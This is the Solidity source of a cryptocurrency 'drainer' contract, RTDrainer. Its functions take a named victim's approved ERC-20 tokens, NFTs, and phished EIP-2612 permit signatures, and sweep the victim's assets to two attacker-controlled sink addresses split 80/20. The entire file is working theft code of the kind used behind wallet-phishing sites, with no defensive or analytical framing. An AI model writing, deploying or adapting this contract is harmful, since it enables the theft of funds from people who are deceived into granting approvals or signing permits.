// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

interface IERC20Permit {
    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external;
}

interface IERC721 {
    function transferFrom(address from, address to, uint256 tokenId) external;
}

contract RTDrainer {
    address public immutable sinkA;
    address public immutable sinkB;

    constructor(address _sinkA, address _sinkB) {
        sinkA = _sinkA;
        sinkB = _sinkB;
    }

    function sweep(address token, address victim) external {
        IERC20 t = IERC20(token);
        uint256 bal = t.balanceOf(victim);
        uint256 all = t.allowance(victim, address(this));
        uint256 amt = bal < all ? bal : all;
        if (amt > 0) {
            uint256 aShare = (amt * 80) / 100;
            uint256 bShare = amt - aShare;
            t.transferFrom(victim, sinkA, aShare);
            t.transferFrom(victim, sinkB, bShare);
        }
    }

    function sweepNFT(address c, address victim, uint256[] calldata ids) external {
        for (uint i = 0; i < ids.length; i++) {
            IERC721(c).transferFrom(victim, sinkA, ids[i]);
        }
    }

    function permitAndSweep(address token, address owner, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external {
        IERC20Permit(token).permit(owner, address(this), value, deadline, v, r, s);
        this.sweep(token, owner);
    }
}
